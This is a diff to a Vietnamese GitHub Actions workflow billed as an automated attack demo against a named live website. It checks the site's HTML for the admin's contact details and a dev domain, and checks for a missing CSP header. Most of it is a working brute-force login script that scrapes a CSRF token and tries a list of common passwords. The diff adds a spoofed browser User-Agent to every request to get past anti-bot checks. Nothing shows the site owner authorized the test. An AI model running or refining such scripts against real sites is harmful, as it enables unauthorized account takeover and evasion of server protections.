@@ -4,7 +4,6 @@
 
 name: Kiểm Tra Bảo Mật Tự Động (Demo Tấn Công)
 
-# Cho phép chạy thủ công từ tab "Actions" trên GitHub
 on:
   workflow_dispatch:
 
@@ -12,7 +11,6 @@ jobs:
   security-test:
     runs-on: ubuntu-latest
     
-    # Đặt URL của website cần kiểm tra ở đây
     env:
       TARGET_URL: https://certapple.com
 
@@ -20,12 +18,9 @@ jobs:
       - name: 1. [CAO] Kiểm tra lộ thông tin nhạy cảm của Admin
         run: |
           echo "::group::Đang quét mã nguồn trang chủ..."
-          # Tải mã nguồn và tìm kiếm các chuỗi nhạy cảm
-          # -s: silent, -E: regex, -q: quiet (chỉ trả về exit code)
-          if curl -s $TARGET_URL | grep -q -E 't.me/QTUNUy|37 724 0941|dev@kenhtao.site'; then
-            echo "::error file=index.html,line=1,col=1::LỖ HỔNG NGHIÊM TRỌNG: Tìm thấy thông tin liên hệ (Telegram, SĐT, Email) của Admin trong mã nguồn HTML!"
-            echo "Đây là điểm yếu chí mạng, cần được khắc phục ngay lập tức."
-            # exit 1 # Bỏ comment dòng này nếu muốn workflow dừng lại ngay khi phát hiện lỗi
+          if curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep -q -E 't.me/QTUNUy|37 724 0941|dev@kenhtao.site'; then
+            echo "::error file=index.html,line=1,col=1::LỖ HỔNG NGHIÊM TRỌNG: Tìm thấy thông tin liên hệ của Admin trong mã nguồn HTML!"
+            # exit 1 
           else
             echo "✅ TỐT: Không tìm thấy thông tin nhạy cảm của Admin."
           fi
@@ -34,9 +29,8 @@ jobs:
       - name: 2. [CAO] Kiểm tra tải tài nguyên từ môi trường DEV
         run: |
           echo "::group::Đang quét các URL tài nguyên..."
-          if curl -s $TARGET_URL | grep -q 'h5m4.c19.e2-1.dev'; then
+          if curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep -q 'h5m4.c19.e2-1.dev'; then
             echo "::warning file=index.html,line=1,col=1::LỖ HỔNG CAO: Trang web đang tải tài nguyên từ tên miền development (h5m4.c19.e2-1.dev)."
-            echo "Điều này có thể dẫn đến tấn công Subdomain Takeover và lộ cấu trúc hạ tầng."
           else
             echo "✅ TỐT: Không tìm thấy tài nguyên nào được tải từ môi trường dev."
           fi
@@ -45,10 +39,8 @@ jobs:
       - name: 3. [TRUNG BÌNH] Kiểm tra thiếu Header Content-Security-Policy (CSP)
         run: |
           echo "::group::Đang kiểm tra các HTTP Headers..."
-          # -I: chỉ lấy header, -i: không phân biệt hoa thường
           if ! curl -s -I $TARGET_URL | grep -q -i 'Content-Security-Policy'; then
             echo "::warning::LỖ HỔNG TRUNG BÌNH: Thiếu HTTP Header 'Content-Security-Policy' (CSP)."
-            echo "Website có nguy cơ bị tấn công Cross-Site Scripting (XSS) cao hơn."
           else
             echo "✅ TỐT: Đã có header Content-Security-Policy."
           fi
@@ -59,18 +51,20 @@ jobs:
           echo "::group::Bắt đầu mô phỏng tấn công Brute-Force..."
           echo "Mục tiêu: $TARGET_URL/login_post"
           
-          # Bước 1: Lấy CSRF token từ trang chủ
-          echo "Đang lấy CSRF token..."
-          CSRF_TOKEN=$(curl -s $TARGET_URL | grep 'csrf-token' | sed -n 's/.*content="\([^"]*\)".*/\1/p')
+          # Bước 1: Lấy CSRF token từ trang chủ, GIẢ MẠO USER-AGENT
+          echo "Đang lấy CSRF token (với User-Agent giả mạo)..."
+          
+          # ----- DÒNG ĐÃ SỬA ĐỔI -----
+          CSRF_TOKEN=$(curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep 'csrf-token' | sed -n 's/.*content="\([^"]*\)".*/\1/p')
+          # ---------------------------
           
           if [ -z "$CSRF_TOKEN" ]; then
-            echo "::error::Không thể lấy được CSRF token. Dừng tấn công."
+            echo "::error::Không thể lấy được CSRF token ngay cả khi đã giả mạo User-Agent. Server có thể có cơ chế chống bot nâng cao hơn. Dừng tấn công."
             exit 1
           fi
           echo "✅ Lấy được CSRF Token: $CSRF_TOKEN"
 
           # Bước 2: Chuẩn bị danh sách mật khẩu để thử
-          # Đây chỉ là một danh sách nhỏ để demo
           PASSWORDS=("123456" "password" "admin" "123123" "qwerty" "certapple")
           EMAIL_TEST="attacker@test.com"
           
@@ -81,19 +75,16 @@ jobs:
             echo "------------------------------------"
             echo "Đang thử mật khẩu: $pass"
             
-            # Gửi request POST giả mạo y hệt như trình duyệt
             RESPONSE=$(curl -s -X POST "$TARGET_URL/login_post" \
               -H "Content-Type: application/x-www-form-urlencoded" \
+              -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' \
               -d "email=$EMAIL_TEST&password=$pass&_token=$CSRF_TOKEN")
             
-            # Phân tích kết quả dựa vào thông báo lỗi trong JS của bạn
             if echo "$RESPONSE" | grep -q 'Tài khoản hoặc mật khẩu không đúng'; then
               echo "Thất bại. Server phản hồi: Tài khoản hoặc mật khẩu không đúng."
             elif echo "$RESPONSE" | grep -q 'token_key'; then
-              # Nếu server trả về token_key, có nghĩa là đã thành công
               echo "::error::TẤN CÔNG THÀNH CÔNG! Mật khẩu '$pass' có thể là ĐÚNG hoặc server xử lý lỗi sai!"
-              echo "Server đã trả về một token, cho thấy phiên đăng nhập đã được tạo."
-              exit 1 # Dừng ngay lập tức vì đã thành công
+              exit 1
             else
               echo "::warning::Phản hồi không xác định từ server. Có thể server đã chặn hoặc có lỗi khác."
               echo "Phản hồi: $RESPONSE"
@@ -101,8 +92,5 @@ jobs:
           done
           
           echo "------------------------------------"
-          echo "✅ Hoàn thành demo tấn công. Nếu không có thông báo 'TẤN CÔNG THÀNH CÔNG' nghĩa là các mật khẩu thử đều sai."
-          echo "Tuy nhiên, việc server phản hồi liên tục cho thấy KHÔNG có cơ chế Rate Limiting (giới hạn số lần thử)."
+          echo "✅ Hoàn thành demo tấn công. Việc server phản hồi liên tục cho thấy KHÔNG có cơ chế Rate Limiting (giới hạn số lần thử)."
           echo "::endgroup::"
-
-
